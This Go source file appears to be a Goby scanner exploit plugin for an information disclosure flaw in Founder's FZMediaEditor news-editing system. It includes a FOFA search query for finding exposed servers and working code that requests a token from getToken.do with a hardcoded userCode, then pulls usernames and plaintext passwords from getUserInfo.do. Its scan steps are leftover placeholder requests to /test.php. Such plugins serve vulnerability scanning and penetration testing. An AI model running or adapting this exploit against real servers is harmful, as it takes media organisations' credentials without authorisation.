package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Founder All Media /newsedit/tokenHelp/getUserInfo.do Information Disclosure Vulnerability",
    "Description": "<p>FZMediaEditor is a professional news gathering and editing system, which is used by news organizations, media companies and other organizations to collect, edit, edit and publish news. The getUserInfo.do interface has an information disclosure vulnerability, which allows unauthorized attackers to obtain sensitive database information.</p>",
    "Product": "FZMediaEditor",
    "Homepage": "http://www founder.com cn",
    "DisclosureDate": "2024-10-30",
    "PostTime": "2024-11-13",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"全媒体采编\" && body=\"/newsedit/newsedit/\"",
    "GobyQuery": "title=\"全媒体采编\" && body=\"/newsedit/newsedit/\"",
    "Level": "1",
    "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information and enterprise secrets.</p><p> 2. In some cases, an attacker may exploit the vulnerability to execute system commands to control the affected system.</p>",
    "Recommendation": "<p>1. Add user authentication mechanism to confirm that the user is logged in, and add permission control to the system's functional points. </p><p> 2. The manufacturer has released the latest version. Follow us <a href=\"http://www\">http://www</a>  founder.com cn</p>",
    "References": [
        "https://wx.zsxq.com/search/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2?groupId=88885811181452"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "db_info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "北大方正全媒体 /newsedit/tokenHelp/getUserInfo.do 信息泄露漏洞",
            "Product": "方正全媒体采编系统",
            "Description": "<p>方正全媒体采编系统（FZMediaEditor）是一款专业的新闻采编系统，用于新闻机构、媒体公司等组织进行新闻的采编、编辑和发布管理。其getUserInfo.do&nbsp;接口存在信息泄露漏洞，未授权的攻击者可获取数据库敏感信息 。<br></p>",
            "Recommendation": "<p>1、加入用户身份认证机制确认用户是登录，对系统的功能点增加权限控制。<br></p><p>2、该厂商已发布最新版本 关注<a href=\"http://www\">http://www</a> founder.com cn</p>",
            "Impact": "<p>1.攻击者可以访问并获取敏感数据，如用户信息、企业机密等。</p><p>&nbsp;2.部分情况下，攻击者可能利用漏洞执行系统命令，控制受影响的系统。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Founder All Media /newsedit/tokenHelp/getUserInfo.do Information Disclosure Vulnerability",
            "Product": "FZMediaEditor",
            "Description": "<p>FZMediaEditor is a professional news gathering and editing system, which is used by news organizations, media companies and other organizations to collect, edit, edit and publish news. The getUserInfo.do interface has an information disclosure vulnerability, which allows unauthorized attackers to obtain sensitive database information.<br></p>",
            "Recommendation": "<p>1. Add user authentication mechanism to confirm that the user is logged in, and add permission control to the system's functional points.&nbsp;</p><p>&nbsp;2. The manufacturer has released the latest version. Follow us <a href=\"http://www\">http://www</a>&nbsp; founder.com cn<br></p>",
            "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information and enterprise secrets.</p><p>&nbsp;2. In some cases, an attacker may exploit the vulnerability to execute system commands to control the affected system.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		setGetRequest2 := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		//捕获token进行第二次发包
		re := regexp.MustCompile(`"token":"([^"]+)"`)
		// 查找匹配
		matches := re.FindStringSubmatch(resp.RawBody)
		var tokenValue string
		if len(matches) > 1 {
			// matches[1] 是 token 的值
			tokenValue = matches[1]
		} else {
			return "", errors.New("fail to match")
		}

		urlGet := "/newsedit/tokenHelp/getUserInfo.do?token=" + tokenValue
		resp, err = setGetRequest2(hostInfo, urlGet, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/newsedit/tokenHelp/getToken.do?userCode=a18f178d935d2284a771f6f5903d7160"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/newsedit/tokenHelp/getToken.do?userCode=a18f178d935d2284a771f6f5903d7160": "pwd",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"db_info": {"/newsedit/tokenHelp/getToken.do?userCode=a18f178d935d2284a771f6f5903d7160", "pwd"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			//匹配密码
			re := regexp.MustCompile(`"pwd":"(.*?)"`)
			match1 := re.FindStringSubmatch(resp)
			var pwd string
			if len(match1) > 1 {
				pwd = match1[1]
			} else {
				expResult.Success = false
				return expResult
			}
			//匹配用户名
			re2 := regexp.MustCompile(`"userCode":"(.*?)"`)
			match2 := re2.FindStringSubmatch(resp)
			var username string
			if len(match2) > 1 {
				username = match2[1]
			} else {
				expResult.Success = false
				return expResult
			}
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Output = "Information leakage:\n" + "username:" + username + "\npassword:" + pwd
			expResult.Success = true
			return expResult
		},
	))
}
